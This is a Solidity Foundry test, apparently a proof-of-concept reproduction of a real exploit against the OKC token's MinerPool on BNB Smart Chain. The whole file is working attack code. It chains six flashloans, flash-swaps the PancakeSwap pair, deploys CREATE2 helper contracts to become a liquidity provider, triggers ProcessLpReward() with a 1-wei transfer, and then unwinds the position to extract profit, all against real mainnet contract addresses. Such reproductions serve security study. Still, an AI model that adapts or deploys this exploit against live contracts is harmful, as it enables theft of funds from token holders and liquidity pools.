// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

/*
// BSC OKC Token MinerPool ProcessLpReward() Exploit
// Author: LCFR (@lcfr_eth)
//
// OKC Token Address: 0xABba891c633Fb27f8aa656EA6244dEDb15153fE0
// MinerPool Address: 0x36016C4F0E0177861E6377f73C380c70138E13EE
//
// https://twitter.com/bbbb/status/1724320628533039428
//
//
// OKC Creates a PancakePool for BSC-USD:OKC.
// OKC rewards users who provide liquidity to the pool.
// Exploit this by Flashloaning BSC-USD and OKC from the pool.
// Become an LP, and then call ProcessLpReward() in the MiningPool contract.
//
// forge test --fork-url $RPC_URL -vv --fork-block-number 33464598 --via-ir --match-path test/OKCProcessLpReward.sol
*/


import {IPancakeRouter01, IPancakeRouter02} from "../src/interfaces/IPancakeRouter.sol";
import {IPancakePair} from "../src/interfaces/IPancakePair.sol";
import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "../src/interfaces/IERC20.sol";

contract ExploitHelper {
    address OKC = 0xABba891c633Fb27f8aa656EA6244dEDb15153fE0;
    address BSCUSD = 0x55d398326f99059fF775485246999027B3197955; 
    address PANCAKELP = 0x9CC7283d8F8b92654e6097acA2acB9655fD5ED96;

    constructor() payable {
        // on deploy transfer all BSC-USD to PANCAKELP
        uint256 bscusd_balance = IERC20(BSCUSD).balanceOf(address(this));
        IERC20(BSCUSD).transfer(PANCAKELP, bscusd_balance); 

        // on deploy transfer all OKC to PANCAKELP
        uint256 okc_balance = IERC20(OKC).balanceOf(address(this));
        IERC20(OKC).transfer(PANCAKELP, okc_balance);
    }

    // transfer a given tokens balance to another address
    function transfer(address token0, address destination) external payable {
        uint256 balance = IERC20(token0).balanceOf(address(this));
        IERC20(token0).transfer(destination, balance);
    }
}

contract OKCProcessLpRewardExploit is Test {
    address exploitHelperOne;
    address exploitHelperTwo;

    address BSCUSD = 0x55d398326f99059fF775485246999027B3197955;      // BSC-USD Token 
    address OKC = 0xABba891c633Fb27f8aa656EA6244dEDb15153fE0; // OKC Token Address
    address MINERPOOL = 0x36016C4F0E0177861E6377f73C380c70138E13EE; // MinerPool for OKC contract

    address DPAADVANCED = 0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d; // First flashloa
    address DPPORACLE = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;   // Second flashloan
    address DPPORACLE_2 = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618; // Third flashloan
    address DPP = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;         // Fourth flashloan
    address DPPORACLE_3 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A; // Fifth flashloan

    address PANCAKEV3POOL = 0x4f3126d5DE26413AbDCF6948943FB9D0847d9818; // BSC-USD -> BUSD V3 POOL
    address PANCAKEROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address PANCAKELP = 0x9CC7283d8F8b92654e6097acA2acB9655fD5ED96; // PANCAKEPAIR / PANCAKELP
    

    uint256 attack_uint256_1 = 2500000000000000000000000; // Amount of BSC-USD to flashloan from PANCAKEV3POOL
    uint256 attack_uint256_2 = 130000000000000000000000;  // Amount of BSD-USD to swap for OKC
    //uint256 attack_uint256_2 = 153000000000000000000000;  // Amount of BSD-USD to swap for OKC

    function setUp() public {
        // deposit 1 wei to this contract to trigger the ProcessLPReward() function in the MiningPool contract
        vm.deal(address(this), 1 wei);

        bytes memory initCode = type(ExploitHelper).creationCode;
        // calculate the addresses for helper contracts using create2
        exploitHelperOne = computeAddress("fuck", keccak256(initCode));
        exploitHelperTwo = computeAddress("shit", keccak256(initCode));    

        // check initial balance of BSC-USD (should be 0)
        (bool success, bytes memory data) = BSCUSD.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
        uint256 balance = abi.decode(data, (uint256));  
        console2.log("Exploit Starting.");
        console2.log("Starting Balance:", balance);
    }

    function testStartExploit() public {
        // First flashloan
        console2.log("Doing First Flashloan. (DPAADVANCED)");
        uint256 balance_dpaadvanced = IERC20(BSCUSD).balanceOf(DPAADVANCED);
        console2.log("First Amount:", balance_dpaadvanced);  

        (bool success, bytes memory data) = DPAADVANCED.call(
          abi.encodeWithSignature(
            "flashLoan(uint256,uint256,address,bytes)", 
            0, 
            balance_dpaadvanced, 
            address(this), 
            new bytes(1)
          ));

        // Exploit is finished at this point.
        // Check ending balance of BSC-USD (should be 6k)
        uint256 balance = IERC20(BSCUSD).balanceOf(address(this));
        console2.log("Exploit Finished.");
        console2.log("Ending Balance:", balance);
    }

    // Flashloan callback/payback function - Used to chain flashloan calls.
    // Each DODOEX:flashloan call calls back to this function
    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
      /////// Second Flashloan
      if (msg.sender == DPAADVANCED) {

        console2.log("Doing Second Flashloan. (DPAORACLE)");
        // get BSDUSD balance of flashloaner 
        uint256 balance = IERC20(BSCUSD).balanceOf(DPPORACLE);
        console2.log("Second Amount:", balance);

        // flashloan balance to exploit contract
        (bool success, bytes memory data) = DPPORACLE.call(
          abi.encodeWithSignature(
            "flashLoan(uint256,uint256,address,bytes)", 
            0, 
            balance, 
            address(this), 
            new bytes(2)
          ));

        console2.log("Paying First Flashloan. (DPAADVANCED)");
        IERC20(BSCUSD).transfer(DPAADVANCED, quoteAmount);
      }
      /////// Third Flashloan
      if (msg.sender == DPPORACLE) {
        console2.log("Doing Third Flashloan. (DPAORACLE_2)");

        // get BSDUSD balance of flashloaner 
        uint256 balance = IERC20(BSCUSD).balanceOf(DPPORACLE_2);
        console2.log("Third Amount:", balance);

        // flashloan balance to exploit contract
        (bool success, bytes memory data) = DPPORACLE_2.call(
          abi.encodeWithSignature(
            "flashLoan(uint256,uint256,address,bytes)", 
            0, 
            balance, 
            address(this), 
            new bytes(3)
          ));

        console2.log("Paying Second Flashloan. (DPPORACLE)");
        IERC20(BSCUSD).transfer(DPPORACLE, quoteAmount);
      }
      /////// Fourth Flashloan
      if (msg.sender == DPPORACLE_2) {
        console2.log("Doing Fourth Flashloan. (DPP)");

        // get BSDUSD balance of flashloaner 
        uint256 balance = IERC20(BSCUSD).balanceOf(DPP);
        console2.log("Fourth Amount:", balance);

        // flashloan balance to exploit contract
        (bool success, bytes memory data) = DPP.call(
          abi.encodeWithSignature(
            "flashLoan(uint256,uint256,address,bytes)", 
            0, 
            balance, 
            address(this), 
            new bytes(4)
          ));

        console2.log("Paying Third Flashloan. (DPPORACLE_2)");
        IERC20(BSCUSD).transfer(DPPORACLE_2, quoteAmount);
      }
      /////// Fifth Flashloan
      if (msg.sender == DPP) {
        console2.log("Doing Fifth Flashloan. (DPPORACLE_3)");

        // get BSDUSD balance of flashloaner 
        uint256 balance = IERC20(BSCUSD).balanceOf(DPPORACLE_3);
        console2.log("Fifth Amount:", balance);

        // flashloan balance to exploit contract
        (bool success, bytes memory data) = DPPORACLE_3.call(
          abi.encodeWithSignature(
            "flashLoan(uint256,uint256,address,bytes)", 
            0, 
            balance, 
            address(this), 
            new bytes(5)
          ));

        console2.log("Paying Fourth Flashloan. (DPP)");
        IERC20(BSCUSD).transfer(DPP, quoteAmount);
      } 
      /////// Sixth Flashloan
      if (msg.sender == DPPORACLE_3) {
        console2.log("Doing Sixth Flashloan. (PANCAKEV3POOL)");

        // call pancakeswap.flash()
        // PANCAKESWAPv3 Pools allow to flashloan the underlying asset pair
        // Flashloan 2500000000000000000000000 BSC-USD to this attack contract
        (bool success, bytes memory data) = PANCAKEV3POOL.call(
          abi.encodeWithSignature(
            "flash(address,uint256,uint256,bytes)", 
            address(this), 
            attack_uint256_1, 
            0, 
            abi.encode([4,attack_uint256_1])
          ));

        // Start repaying flashloans in reverse order.
        console2.log("Paying Fifth Flashloan. (DPPORACLE_3)");
        IERC20(BSCUSD).transfer(DPPORACLE_3, quoteAmount);
      } 

    }

    // PancakeV3 flashloan callback. Generally used to payback the loan
    function pancakeV3FlashCallback(
        uint256 fee0, // will be 2500000000000000000000000
        uint256 fee1, // will be 0
        bytes calldata data // will be [abi.encode([4,2500000000000000000000000]]
    ) external {

      uint256 total_position = IERC20(BSCUSD).balanceOf(address(this));
      console2.log("Total BSC-USD Flashloaned:", total_position);

      address[] memory path = new address[](2);
      // go from BSC-USD to OKC
      path[0] = BSCUSD;
      path[1] = OKC;
      /*
      Given an input asset amount and an array of token addresses, calculates all subsequent maximum output token amounts by 
      calling getReserves for each pair of token addresses in the path in turn, and using these to call getAmountOut.
      Useful for calculating optimal token amounts before calling swap.
      get amount of OKC to receive for 130000000000000000000000 BSC-USD
      the amount you provide is assumed to be of path[0] and the amount you will receive is of path[1]
      */
      uint[] memory amountOut = IPancakeRouter01(PANCAKEROUTER).getAmountsOut(attack_uint256_2, path);
      console2.log("Amount of OKC to swap for:", amountOut[1]);

      console2.log("My OKC Balance:", IERC20(OKC).balanceOf(address(this)));
      console2.log("My BSC-USD Balance:", IERC20(BSCUSD).balanceOf(address(this)));

      uint256 lpOkcBalance = IERC20(OKC).balanceOf(PANCAKELP);
      console2.log("PANCAKELP OKC Balance:", lpOkcBalance);
      uint256 lpBscusdBalance = IERC20(BSCUSD).balanceOf(PANCAKELP);
      console2.log("PANCAKELP BSC-USD Balance:", lpBscusdBalance);

      // https://docs.uniswap.org/contracts/v2/concepts/core-concepts/flash-swaps
      // https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps
      // https://docs.uniswap.org/contracts/v2/reference/smart-contracts/pair#swap-1
      // https://www.rareskills.io/post/uniswap-v2-swap-function

      // flashSwap large amount BSD-USD and OKC from PANCAKELP to this contract
      // this will call the pancakeCall() function in this contract to provide the amountIn(pay) for the flashloan
      IPancakePair(PANCAKELP).swap(1, amountOut[1], address(this), abi.encode(attack_uint256_2));
      // uses the swap callback to pay the amountIn for the flashswap instead

      uint256 lpOkcBalanceAfter = IERC20(OKC).balanceOf(PANCAKELP);
      console2.log("PANCAKELP OKC Balance After:", lpOkcBalanceAfter);
      uint256 lpBscusdBalanceAfter = IERC20(BSCUSD).balanceOf(PANCAKELP);
      console2.log("PANCAKELP BSC-USD Balance After:", lpBscusdBalanceAfter);

      console2.log("My OKC Balance After:", IERC20(OKC).balanceOf(address(this)));
      console2.log("My BSC-USD Balance After:", IERC20(BSCUSD).balanceOf(address(this)));

      bytes memory createCode = type(ExploitHelper).creationCode;

      // Transfer 10000000000000000 OKC to exploitHelperOne before deploying contract.
      // This will have the exploitHelperOne send the BSC-USD to the PANCAKELP contract.
      console2.log("Transfer 10000000000000000 OKC to exploitHelperOne address.");
      IERC20(OKC).transfer(exploitHelperOne, 10000000000000000);

      // Deploy exploitHelperOne 
      console2.log("Deploy exploitHelperOne w/ Create2 to address.");
      address createdOne = create2address(createCode, bytes32("fuck"));
      require(createdOne == exploitHelperOne, "create2 first deploy address mismatch");

      // Transfer 100000000000000 BSC-USD to exploitHelperTwo before deploying contract.
      // This will have the exploitHelperTwo send the BSC-USD to the PANCAKELP contract.
      console2.log("Transfer 100000000000000 BSC-USD to exploitHelperTwo address.");
      IERC20(BSCUSD).transfer(exploitHelperTwo, 100000000000000);

      // Transfer 1 OKC to exploitHelperTwo before deploying contract.
      console2.log("Transfer 1 OKC to exploitHelperTwo address.");
      IERC20(OKC).transfer(exploitHelperTwo, 1);

      // Deploy exploitHelperTwo
      console2.log("Deploy exploitHelperTwo w/ Create2 to address.");
      address createdTwo = create2address(createCode, bytes32("shit"));
      require(createdTwo == exploitHelperTwo, "create2 second deploy address mismatch");

      console2.log("calling getReserves()");
      // get reserves of token0 and token1
      (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast) = IPancakePair(PANCAKELP).getReserves();
      console2.log("PANCAKELP reserve0 %d", reserve0);
      console2.log("PANCAKELP reserve1 %d", reserve1);

      // get OKC balance of this contract
      uint256 okc_balance = IERC20(OKC).balanceOf(address(this));
      console2.log("My current OKC Balance: %d", okc_balance);

      // get a quote of how many LP tokens we can mint if we supply our current okc balance
      uint total = IPancakeRouter01(PANCAKEROUTER).quote(okc_balance, reserve1, reserve0);
      console2.log("Get liquidity LP quote(): %d", total);

      // Transfer BSC-USD to PANCAKELP
      IERC20(BSCUSD).transfer(PANCAKELP, total);

      // Transfer OKC to PANCAKELP
      IERC20(OKC).transfer(PANCAKELP, okc_balance);

      // Become an OKC LP by minting LP tokens.
      uint lpTokenAmt = IPancakePair(PANCAKELP).mint(address(this));
      
      // transfer PANCAKELP liquidity tokens to exploitHelperTwo
      IPancakePair(PANCAKELP).transfer(exploitHelperTwo, lpTokenAmt);

      console2.log("MinerPool BSC-USD Balance before ProcessLpReward(): %d", IERC20(BSCUSD).balanceOf(MINERPOOL));
      console2.log("MinerPool OKC Balance before ProcessLpReward(): %d", IERC20(OKC).balanceOf(MINERPOOL));

      console2.log("Sending 1WEI to trigger ProcessLpReward() in MiningPool contract.");
      // transfer 1WEI to 0x36016c4f0e0177861e6377f73c380c70138e13ee
      MINERPOOL.call{value: 1 wei}(""); // trigger processLPReward() in the MiningPool contract

      console2.log("MinerPool BSC-USD Balance AFTER ProcessLpReward(): %d", IERC20(BSCUSD).balanceOf(MINERPOOL));
      console2.log("MinerPool OKC Balance AFTER ProcessLpReward(): %d", IERC20(OKC).balanceOf(MINERPOOL));

      // transfer PANCAKELP liquidity tokens to this exploit contract.
      exploitHelperTwo.call(abi.encodeWithSignature("transfer(address,address)", PANCAKELP, address(this)));

      // approve pancake router to spend PANCAKELP liquidity tokens
      IPancakePair(PANCAKELP).approve(PANCAKEROUTER, type(uint256).max);

      // remove liquidity (OKC/BSC-USD) from PANCAKEROUTER
      IPancakeRouter01(PANCAKEROUTER).removeLiquidity(
        OKC,
        BSCUSD,
        lpTokenAmt,
        0,
        0,
        address(this),
        block.timestamp
      );

      console2.log("OKC Balance after removeLiquidity(): %d", IERC20(OKC).balanceOf(address(this)));
      console2.log("BSC-USD Balance after removeLiquidity(): %d", IERC20(BSCUSD).balanceOf(address(this)));

      // Transfer the OKC tokens held by exploitHelperOne to this address
      exploitHelperOne.call(abi.encodeWithSignature("transfer(address,address)", OKC, address(this)));

      // Transfer the OKC tokens held by exploitHelperTwo to this address
      exploitHelperTwo.call(abi.encodeWithSignature("transfer(address,address)", OKC, address(this)));

      // Get current balance of OKC Tokens held by this contract
      okc_balance = IERC20(OKC).balanceOf(address(this));

      // approve pancake router to spend OKC tokens
      IERC20(OKC).approve(PANCAKEROUTER, type(uint256).max);

      // go from OKC to BSC-USD
      path[0] = OKC;
      path[1] = BSCUSD;

      // swap OKC to BSC-USD
      IPancakeRouter02(PANCAKEROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
        okc_balance,
        0,
        path,
        address(this),
        block.timestamp
      );
      console2.log("OKC Balance after swapExactTokensForTokensSupportingFeeOnTransferTokens(): %d", IERC20(OKC).balanceOf(address(this)));
      console2.log("BSC-USD Balance after swapExactTokensForTokensSupportingFeeOnTransferTokens(): %d", IERC20(BSCUSD).balanceOf(address(this)));

      // Transfer 2500250000000000000000000 BSC-USD tokens to PANCAKEV3POOL paying back the 2.5m flashloan + fee. 
      IERC20(BSCUSD).transfer(PANCAKEV3POOL, 2500250000000000000000000);
    }

    // Pancake swap callback
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
      // transfer 130000000000000000000000 BSC-USD to PANCAKELP to use as amountIn for the flashloan/flashSwap
      IERC20(BSCUSD).transfer(PANCAKELP, abi.decode(data, (uint256)));
    }

    function computeAddress(bytes32 salt, bytes32 creationCodeHash) public view returns (address addr) {
        address contractAddress = address(this);
        assembly {
            let ptr := mload(0x40)

            mstore(add(ptr, 0x40), creationCodeHash)
            mstore(add(ptr, 0x20), salt)
            mstore(ptr, contractAddress)
            let start := add(ptr, 0x0b)
            mstore8(start, 0xff)
            addr := keccak256(start, 85)
        }
    }

    function create2address(bytes memory createCode, bytes32 salt) public returns(address created) {
        assembly {
          created := create2(
            callvalue(),         
            add(createCode, 0x20), 
            mload(createCode),     
            salt
            )
        }
    }

}
